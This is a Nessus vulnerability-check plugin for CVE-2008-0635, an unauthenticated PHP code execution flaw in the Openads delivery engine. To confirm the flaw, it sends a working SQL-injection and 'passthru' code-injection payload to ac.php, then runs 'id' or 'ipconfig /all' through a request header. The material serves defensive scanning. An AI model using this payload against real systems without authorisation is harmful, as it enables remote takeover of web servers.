#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(34372);
  script_version("$Revision: 1.12 $");

  script_cve_id("CVE-2008-0635");
  script_bugtraq_id(27603);
  script_osvdb_id(41113);
  script_xref(name:"Secunia", value:"28790");

  script_name(english:"Openads Delivery Engine OA_Delivery_Cache_store() Function name Argument Arbitrary PHP Code Execution");
  script_summary(english:"Tries to run a command");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that allows injection
of arbitrary PHP commands." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Openads, an open source ad serving
application written in PHP. 

The installed version of Openads contains a vulnerability in its
delivery engine in that it fails to properly sanitize input to the
'name' argument of the 'OA_Delivery_Cache_store()' function in various
scripts under 'www/delivery' before saving it in a cache file.  An
unauthenticated, remote attacker can exploit this issue to inject
arbitrary PHP code and then execute it on the remote host, subject to
the privileges under which the web server operates." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/archive/1/487486/100/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Openads 2.4.3 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
 script_set_attribute(attribute:"canvas_package", value:'CANVAS');
 script_cwe_id(94);
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/10/09");
 script_cvs_date("$Date: 2016/05/12 14:46:29 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >!< os) cmd = "id";
  else cmd = "ipconfig /all";
  cmds = make_list(cmd);
}
else cmds = make_list("id", "ipconfig /all");
cmd_pats = make_array();
cmd_pats["id"] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats["ipconfig /all"] = "Windows IP Configuration";

# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/openads", "/ads", "/adserver", "/openx", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Inject our exploit.
  #
  # nb: we also leverage a SQL injection issue to avoid having to find
  #     a valid bannerid; without it, OA_Delivery_Cache_buildFileName()
  #     won't be called and the exploit won't work.
  fake_srv = string("NESSUS_", toupper(rand_str()));
  exploit = string("-", unixtime(), " OR 1=1 -- ';passthru(base64_decode($_SERVER[HTTP_", fake_srv, "]));die;/*");
  url = string(
    dir, "/www/delivery/ac.php?",
    "bannerid=", str_replace(find:" ", replace:"+", string:exploit)
  );

  w = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
  res = w[2];

  # If we see an ad...
  if ("www/delivery/ck.php?oaparams=" >< res)
  {
    # Try to execute a command.
    foreach cmd (cmds)
    {
      w = http_send_recv3(method:"GET", item:url, port:port,
      	add_headers: make_array(fake_srv, base64(str:cmd)));
      #  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
      if (isnull(w)) res = NULL; else res = w[2];
      # nb: res will be NULL if the command fails!
      # MA 2009-12-11: did this mean that the server would not return a correct answer
      # or just an empty body?

      # There's a problem if we see output from our command.
      if (egrep(pattern:cmd_pats[cmd], string:res))
      {
        if (report_verbosity)
        {
          output = "";
          foreach line (split(res, keep:TRUE))
            output += ereg_replace(pattern:'^[ \t]*', replace:"  ", string:line);

          report = string(
            "\n",
            "Nessus was able to execute the command '", cmd, "' on the remote\n",
            "host. This produced the following results :\n",
            "\n",
            output
          );
          security_hole(port:port, extra:report);
        }
        else security_hole(port);
        exit(0);
      }
    }
  }
}
